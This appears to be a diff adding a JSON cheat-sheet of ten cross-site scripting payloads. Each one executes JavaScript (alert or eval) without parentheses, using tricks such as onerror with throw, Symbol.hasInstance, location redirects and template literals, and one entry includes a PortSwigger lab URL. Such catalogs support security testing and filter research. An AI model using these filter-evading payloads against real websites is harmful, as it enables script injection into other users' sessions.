@@ -1,0 +1,112 @@
+[
+    {
+        "description": "No parentheses using exception handling",
+        "code": "<script>onerror=alert;throw 1<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using exception handling no semi colons",
+        "code": "<script>{onerror=alert}throw 1<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using exception handling no semi colons using expressions",
+        "code": "<script>throw onerror=alert,1<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using exception handling and eval",
+        "code": "<script>throw onerror=eval,'=alert\\x281\\x29'<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using exception handling and eval on Firefox",
+        "code": "<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using ES6 hasInstance and instanceof with eval",
+        "code": "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using ES6 hasInstance and instanceof with eval without .",
+        "code": "<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using location redirect",
+        "code": "<script>location='javascript:alert\\x281\\x29'<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "No parentheses using location redirect no strings",
+        "code": "<script>location=name<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20name=javascript:alert(1)%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D<script>location=name<\/script>%22%3E%3C%2Fiframe%3E"
+    },
+    {
+        "description": "No parentheses using template strings",
+        "code": "<script>alert`1`<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    }
+]
